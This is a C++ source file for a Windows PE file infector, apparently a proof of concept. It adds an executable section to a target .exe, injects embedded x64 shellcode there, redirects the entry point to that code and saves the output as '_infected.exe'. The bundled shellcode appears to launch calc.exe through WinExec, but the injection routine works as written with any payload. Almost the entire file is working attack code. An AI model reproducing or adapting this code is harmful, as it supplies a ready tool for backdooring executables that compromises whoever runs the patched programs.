#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996)

#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define fail(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)

#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))


char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";

BOOL ReadBinFile(const char* fileName, char*& buffer, DWORD& size)
{
	// Open file
	FILE* fp = nullptr;
	if (fopen_s(&fp, fileName, "rb"))
	{
		return false;
	}
	else
	{
		// Get the size of the binary file
		fseek(fp, 0, SEEK_END);
		size = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		// Get the content of the binary file
		buffer = new char[size];
		if (buffer == nullptr)
		{
			fclose(fp);
			return false;
		}
		fread(buffer, sizeof(char), size, fp);

		// finalization
		fclose(fp);
		return true;
	}
}

void Patcher(char* buff, const char *FileName, DWORD FileSize)
{
	// calculate the output file size and create new memory for storage
	// P2ALIGNUP: allignment
	info("malloc memory for outputed *.exe file.");	
	size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment,
		   fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment,
		   finalOutSize = FileSize + P2ALIGNUP(sizeof(shellcode), fileAlign);
	char* outBuf = (char*)malloc(finalOutSize);
	memcpy(outBuf, buff, FileSize);

	// create a new section to store shellcode
	info("create a new section to store shellcode.");
	auto sectArr = getSectionArr(outBuf);
	PIMAGE_SECTION_HEADER lastestSecHdr = &sectArr[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1];
	PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1;
	memcpy(newSectionHdr->Name, "XD3anSEC", 8);
	/*
		typedef struct _IMAGE_SECTION_HEADER {
			BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
			union {
					DWORD   PhysicalAddress;
					DWORD   *VirtualSize;
			} Misc;
			DWORD   *VirtualAddress;
			DWORD   *SizeOfRawData;
			DWORD   *PointerToRawData;
			DWORD   PointerToRelocations;
			DWORD   PointerToLinenumbers;
			WORD    NumberOfRelocations;
			WORD    NumberOfLinenumbers;
			DWORD   *Characteristics;    -> IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
		} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
	*/
	newSectionHdr->Misc.PhysicalAddress = P2ALIGNUP(sizeof(shellcode), sectAlign);
	//newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(shellcode), sectAlign);
	newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign);
	newSectionHdr->SizeOfRawData = sizeof(shellcode);
	newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData;
	// PointerToRelocations
	// PointerToLinenumbers
	// NumberOfRelocations
	// NumberOfLinenumbers
	newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	
	// put shellcode into new section
	info("pack shellcode into new section.");
	memcpy(outBuf + newSectionHdr->PointerToRawData, shellcode, sizeof(shellcode));

	// fix binary
	info("fix binary attributes");
	info("\t\\__ NumberOfSection");
	// NumberOfSection
	getNtHdr(outBuf)->FileHeader.NumberOfSections += 1;	
	// VirtualSize of each section
	info("\t\\__ VirtualSize");
	for (size_t i = 1; i < getNtHdr(outBuf)->FileHeader.NumberOfSections; i++)
		sectArr[i - 1].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - 1].VirtualAddress;
	// SizeOfImage
	info("\t\\__ SizeOfImage");
	getNtHdr(outBuf)->OptionalHeader.SizeOfImage =
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].VirtualAddress +
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].Misc.VirtualSize;
	// AddressOfEntryPoint
	info("\t\\__ EP (AddressOfEntryPoint) to shellcode.");
	getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress;

	// put to new file
	info("put to new file");
	char outputPath[MAX_PATH];
	memcpy(outputPath, FileName, sizeof(outputPath));
	strcpy(strrchr(outputPath, '.'), "_infected.exe");
	FILE* fp = fopen(outputPath, "wb");
	fwrite(outBuf, 1, finalOutSize, fp);
	fclose(fp);
	okay("file saved at %s", outputPath);
	okay("done.");
}

int main(int argc, char** argv) 
{
	if (argc != 2) 
	{
		warn("Usage: ./PE_Patcher.exe [path/to/file]");
		return 0;
	}

	char* buff; 
	DWORD FileSize;

	if (!ReadBinFile(argv[1], buff, FileSize))
		warn("selected file not found.");
	else
		Patcher(buff, argv[1], FileSize);
	
	return 0;
}